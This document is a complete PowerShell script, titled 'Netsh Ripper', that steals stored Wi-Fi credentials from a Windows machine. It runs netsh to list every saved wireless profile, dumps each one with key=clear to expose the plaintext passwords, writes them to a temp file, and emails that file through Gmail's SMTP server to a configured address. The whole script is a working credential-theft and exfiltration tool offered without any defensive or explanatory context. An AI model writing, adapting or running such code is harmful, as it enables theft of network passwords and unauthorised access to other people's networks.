# setup variables
$GmailAccount = ''
$GmailPassWord = ''
$FromAddress = ''
$ToAddress = ''
$Subject = 'Netsh Ripper'


# set working directory
Set-Location -Path $env:tmp -PassThru

# paths and regex
$InputPath = 'C:\Windows\Temp\out.txt'
$OutputFile = 'C:\Windows\Temp\output.txt'
$NetshResult = 'C:\Windows\Temp\result.txt'
$regex = "\s:[a-zA-Z0-9]*.[a-zA-Z0-9]*.*"

# write the wlan profiles to an text file
netsh wlan show profiles | Out-File $InputPath

# parse output
Select-String -Path $InputPath -Pattern $regex -AllMatches  | select Matches  | Out-File $OutputFile
(Get-Content $OutputFile) -replace '{ : ','' -replace '}','' -replace '\  +', ''| Select-Object -Skip 3 | Set-Content $OutputFile

# look into all profile entry's
$Result = foreach ($WiFi in Get-Content $OutputFile) {
netsh wlan show profile name="$WiFi" key=clear
} 

# write output
$Result | Out-File $NetshResult

# setup the mail server and mail file
$SMTPServer = 'smtp.gmail.com'
$SMTP = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTP.EnableSsl = $true
$SMTP.Credentials = New-Object System.Net.NetworkCredential($GmailAccount,$GmailPassWord)
$Message = New-Object System.Net.Mail.MailMessage
$Message.From = $FromAddress
$Message.To.Add($ToAddress)
$Message.Subject = $Subject
$Message.IsBodyHtml = $True 
$Attachment = $NetshResult
$Attach = new-object Net.Mail.Attachment($Attachment) 
$Message.Attachments.Add($Attach)
$SMTP.Send($Message)